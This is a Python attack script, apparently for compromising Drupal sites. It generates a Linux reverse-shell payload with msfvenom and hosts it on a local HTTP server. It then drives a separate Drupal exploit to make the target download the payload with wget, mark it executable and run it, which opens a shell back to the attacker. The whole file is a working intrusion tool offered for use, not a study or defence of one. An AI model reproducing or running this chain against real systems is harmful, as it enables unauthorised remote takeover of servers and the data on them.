import os
import sys
import urllib
from os import system, name
import subprocess



def linux():

       lhost = input("Enter LHOST: ")
       lport = input("Enter LPORT: ")
       rhost = input("Enter RHOST: ")
       payl  = input("Enter Payload Name: ")
       os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf > %s.elf"%(lhost,lport,payl))
       def clear(): _ = system('clear')
       clear()
       print ("Payload Successfuly Generated")

       subprocess.Popen(["python3","-m","http.server","8080"])

       os.system("python3 drupal-exploit.py -c 'wget http://%s:8080/%s.elf' http://%s/"%(lhost,payl,rhost))
       os.system("python3 drupal-exploit.py -c 'chmod 777 %s.elf' http://%s/"%(payl,rhost))
       os.system("python3 drupal-exploit.py -c './%s.elf' http://%s/"%(payl,rhost))
  
print("""notes for usage:
          -the script must be in the same folder as the Pimps exploit""")
print("""
  Which OS do you want to target
  1) Linux
  2) Windows""")
os_type = input("Answer: ")
print("")
if os_type == "1":
     linux()
     #injectlinux()
else:
    print("sorry this is under construction")
